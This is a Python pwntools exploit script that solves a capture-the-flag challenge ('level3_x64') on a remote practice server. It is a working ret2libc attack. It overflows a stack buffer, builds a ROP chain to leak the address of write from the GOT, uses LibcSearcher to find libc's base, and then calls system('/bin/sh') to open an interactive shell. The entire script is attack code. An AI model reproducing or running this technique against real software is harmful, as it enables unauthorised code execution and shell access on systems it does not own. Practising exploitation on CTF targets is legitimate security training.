from pwn import *
from LibcSearcher import *

context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn','''
#            b main
#            b vulnerable_function
#            ''')
#io=process('./pwn')
io=remote('node4.buuoj.cn',29232)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

#libc=ELF('./libc-2.19.so')
elf=ELF('./level3_x64')
#rdi rsi rdx rcx r8 r9



ru(b'Input:\n')



write_got=elf.got['write']
write=elf.plt['write']

main=elf.sym['main']

prdi=0x00000000004006b3# : pop rdi ; ret

rsi_r15=0x00000000004006b1 #: pop rsi ; pop r15 ; ret


payload=b'a'*(0x80+8)

payload+=p64(prdi)




payload+=p64(1)
payload+=p64(rsi_r15)
payload+=p64(write_got)+p64(0)
payload+=p64(write)
payload+=p64(main)



sl(payload)




addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
 
libc=LibcSearcher('write',addr)
libc_base_addr=addr-libc.dump('write')
system_addr=libc_base_addr+libc.dump('system')
bin_sh_addr=libc_base_addr+libc.dump('str_bin_sh')






#addr=u32(io.recvuntil(b'\xf7')[-4:])
#ru(b'0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
#print(hex(rbp))

print(hex(addr))


#libc_base_addr=addr-libc.sym['write']
#system_addr=libc_base_addr+ libc.sym['system']    
#bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))

ru(b'Input:\n')
payload2=b'a'*(0x80+8)+p64(prdi)+p64(bin_sh_addr)+p64(system_addr)


sl(payload2)


ii()
